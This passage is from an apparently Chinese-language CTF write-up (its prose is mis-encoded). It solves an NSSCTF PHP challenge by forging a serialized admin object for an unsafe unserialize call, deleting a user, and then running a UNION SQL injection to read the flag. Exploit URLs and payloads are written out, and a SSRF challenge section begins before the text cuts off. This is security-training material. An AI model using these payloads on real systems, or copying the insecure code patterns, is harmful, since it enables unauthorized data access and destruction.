class="variable">$o</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="title function_ invoke__">display</span>(<span class="variable">$o</span>[<span class="string">&#x27;msg&#x27;</span>]);</span><br><span class="line">                &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>api.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;common.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (@<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] === <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:/web/riji.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">admin</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$check</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$method</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$userid</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$msgid</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$this</span>-&gt;name);</span><br><span class="line">        @<span class="title function_ invoke__">mysql_conn</span>();</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from user where name=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = @<span class="title function_ invoke__">mysql_fetch_array</span>(<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>));</span><br><span class="line">        <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;check === <span class="title function_ invoke__">md5</span>(<span class="variable">$result</span>[<span class="string">&#x27;salt&#x27;</span>] . <span class="variable">$this</span>-&gt;data . <span class="variable">$username</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;(=-=)!!&#x27;</span>;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;role&#x27;</span>] == <span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">do_method</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>() === <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;method === <span class="string">&#x27;del_msg&#x27;</span>)&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">del_msg</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">elseif</span>(<span class="variable language_">$this</span>-&gt;method === <span class="string">&#x27;del_user&#x27;</span>)&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">del_user</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">del_msg</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;msgid)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$msg_id</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$this</span>-&gt;msgid);</span><br><span class="line">            @<span class="title function_ invoke__">mysql_conn</span>();</span><br><span class="line">            <span class="variable">$sql1</span> = <span class="string">&quot;DELETE FROM msg where id=&#x27;<span class="subst">$msg_id</span>&#x27;&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql1</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;Delete message success!!&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;Delete message wrong!!&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;Check Your msg_id!!&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">del_user</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;userid)&#123;</span><br><span class="line">            <span class="variable">$user_id</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$this</span>-&gt;userid);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$user_id</span> == <span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;Admin can\&#x27;t delete!!&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            @<span class="title function_ invoke__">mysql_conn</span>();</span><br><span class="line">            <span class="variable">$sql2</span> = <span class="string">&quot;DELETE FROM user where userid=&#x27;<span class="subst">$user_id</span>&#x27;&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql2</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;Delete user success!!&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;Delete user wrong!!&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;Check Your user_id!!&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$api</span>));</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">do_method</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(@<span class="variable">$login</span>==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    @<span class="title function_ invoke__">mysql_conn</span>();</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from user where name=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = @<span class="title function_ invoke__">mysql_fetch_array</span>(<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>));</span><br><span class="line">    <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$result</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;passwd&#x27;</span>] == <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$user_cookie</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable">$user_cookie</span> .= <span class="variable">$result</span>[<span class="string">&#x27;userid&#x27;</span>];</span><br><span class="line">            <span class="variable">$user_cookie</span> .= <span class="variable">$result</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">            <span class="variable">$user_cookie</span> .= <span class="variable">$result</span>[<span class="string">&#x27;salt&#x27;</span>];</span><br><span class="line">            <span class="variable">$cookies</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$user_cookie</span>);</span><br><span class="line">            <span class="comment">//$cookies = $user_cookie;</span></span><br><span class="line">            <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;user&quot;</span>,<span class="variable">$cookies</span>,<span class="title function_ invoke__">time</span>()+<span class="number">60</span>,<span class="string">&#x27;/web/&#x27;</span>);</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:/web/riji.php&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Password Worng?&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Username Worng?&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>forget.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(@<span class="variable">$forget</span>==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    @<span class="title function_ invoke__">mysql_conn</span>();</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from user where name=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = @<span class="title function_ invoke__">mysql_fetch_array</span>(<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>));</span><br><span class="line">    <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$result</span>))</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;salt&#x27;</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$check</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$result</span>[<span class="string">&#x27;salt&#x27;</span>]));</span><br><span class="line">            <span class="variable">$name</span> = <span class="variable">$result</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:/web/repass.php?username=<span class="subst">$name</span>&amp;check=<span class="subst">$check</span>&amp;mibao=<span class="subst">$mibao</span>&amp;pass=<span class="subst">$pass</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Get salt Worng?&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Please check!!?&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆæ¥æ‹ä¸€ä¸‹æ€è·¯ï¼šriji.phpä¸­å­˜åœ¨sqlæ³¨å…¥çš„ç‚¹ä¹Ÿå°±æ˜¯idï¼Œä½†æ˜¯idåœ¨ä¹‹å‰è¢«èµ‹å€¼äº†ï¼Œæœ‰æ²¡æœ‰åŠæ³•è®©ä»–ä¸è¿›å…¥ifå‘¢ï¼Ÿ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;userid&#x27;</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$id</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$result</span>[<span class="string">&#x27;userid&#x27;</span>]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>é‚£å°±æ˜¯result[â€˜useridâ€™]ç»“æœä¸ºç©ºçš„æƒ…å†µä¸‹ã€‚</p>
<p>å…ˆåˆ©ç”¨api.phpçš„ä¸€ä¸ªæ¥å£å‡½æ•°ä»æ•°æ®åº“åˆ é™¤æˆ‘ç°åœ¨ç™»é™†çš„ç”¨æˆ·ï¼Œä½¿select * from user where name&#x3D;â€™$usernameâ€™æŸ¥è¯¢ä¸ºç©ºï¼Œå› ä¸ºæˆ‘ä»¬ä¸€ç›´ç™»é™†ï¼Œæ‰€ä»¥sessionä¼šåœ¨æœåŠ¡å™¨ç«¯ä¿æŒæˆ‘ä»¬ç™»é™†çš„çŠ¶æ€ï¼ˆä¹Ÿå°±æ˜¯è¯´æœåŠ¡å™¨ç«¯çš„sessionä¸ä¼šæ³¨é”€ï¼‰ï¼Œæ‰€ä»¥if($_SESSION[â€˜userâ€™])åœ¨æ³¨é”€ä¹‹å‰ä¸€ç›´ä¸ºçœŸï¼Œæ‰€ä»¥å½“æˆ‘ä»¬åœ¨æ•°æ®åº“ä¸­åˆ é™¤æˆ‘ä»¬ç™»é™†çš„ç”¨æˆ·ä¹‹åï¼Œåˆ™ä½¿ï¼š$id &#x3D; intval($result[â€˜useridâ€™]); è¿™é‡Œ$idæˆä¸ºä¸€ä¸ªæœªè¢«åˆå§‹åŒ–çš„å˜é‡ï¼Œç„¶åå°±å¯ä»¥è¢«ä»»æ„è¦†ç›–ã€‚åœ¨common.phpä¸­è¿›è¡Œå˜é‡è¦†ç›–ã€‚</p>
<p>åœ¨api.phpä¸­ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦åˆ é™¤ç”¨æˆ·ï¼Œæ˜¯éœ€è¦check&#x3D;&#x3D;&#x3D;1çš„ï¼Œé‡Œé¢å­˜åœ¨ä¸€ä¸ªè€ƒç‚¹ï¼šhashé•¿åº¦æ‹“å±•æ”»å‡»ã€‚</p>
<p>æˆ‘ä»¬å…ˆè·å–ä¸€ä¸‹useridï¼Œå¾…ä¼šè¦åˆ é™¤çš„userid</p>
<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104115507603.png" alt="image-20250104115507603" style="zoom:80%;" />

<p>useridä¸º2</p>
<p>ç„¶åå»æ„é€ apiçš„payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;role&#x27;</span>] == <span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure>

<p>åªæœ‰adminç”¨æˆ·æ‰èƒ½åˆ é™¤ç”¨æˆ·ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ„é€ å¦‚ä¸‹payloadï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">admin</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$name</span>=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$check</span>=<span class="string">&quot;f94ecd6b9856b048313eeb7d0179cb32&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$data</span>=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$method</span>=<span class="string">&quot;del_user&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$userid</span>=<span class="string">&quot;2&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">admin</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p>è¿™é“é¢˜saltç›´æ¥å‘Šè¯‰æˆ‘ä»¬äº†ï¼Œæˆ‘ä»¬å°±ä¸éœ€è¦hashé•¿åº¦æ‹“å±•æ”»å‡»äº†ã€‚ã€‚ã€‚</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104115941234.png" alt="image-20250104115941234"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tzo1OiJhZG1pbiI6NTp7czo0OiJuYW1lIjtzOjU6ImFkbWluIjtzOjU6ImNoZWNrIjtzOjMyOiJmOTRlY2Q2Yjk4NTZiMDQ4MzEzZWViN2QwMTc5Y2IzMiI7czo0OiJkYXRhIjtzOjE6IjEiO3M6NjoibWV0aG9kIjtzOjg6ImRlbF91c2VyIjtzOjY6InVzZXJpZCI7czoxOiIyIjt9</span><br></pre></td></tr></table></figure>

<p>ç„¶åå»api.phpåˆ é™¤ç”¨æˆ·ã€‚</p>
<p>ä½†æ˜¯æˆ‘ä»¬å‘ç°</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (@<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] === <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:/web/riji.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯æˆ‘ä»¬éœ€è¦ä¿æŒç™»é™†çŠ¶æ€ï¼Œé‚£ä¹ˆæ¢ä¸ªæµè§ˆå™¨ã€‚ã€‚</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104120856200.png" alt="image-20250104120856200"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28105/api.php?api=Tzo1OiJhZG1pbiI6NTp7czo0OiJuYW1lIjtzOjU6ImFkbWluIjtzOjU6ImNoZWNrIjtzOjMyOiJmOTRlY2Q2Yjk4NTZiMDQ4MzEzZWViN2QwMTc5Y2IzMiI7czo0OiJkYXRhIjtzOjE6IjEiO3M6NjoibWV0aG9kIjtzOjg6ImRlbF91c2VyIjtzOjY6InVzZXJpZCI7czoxOiIyIjt9</span><br></pre></td></tr></table></figure>

<p>useråˆ é™¤æˆåŠŸï¼</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104120932581.png" alt="image-20250104120932581"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28105/riji.php?id=-1%20union%20select%201,2,(select%20flag%20from%20flag)</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104120944656.png" alt="image-20250104120944656"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;bea1ea82-0c83-4722-8a89-a41b35a5c119&#125;</span><br></pre></td></tr></table></figure>





<h2 id="De1ctf-2019-SSRF-Me"><a href="#De1ctf-2019-SSRF-Me" class="headerlink" title="[De1ctf 2019]SSRF Me"></a>[De1ctf 2019]SSRF Me</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = 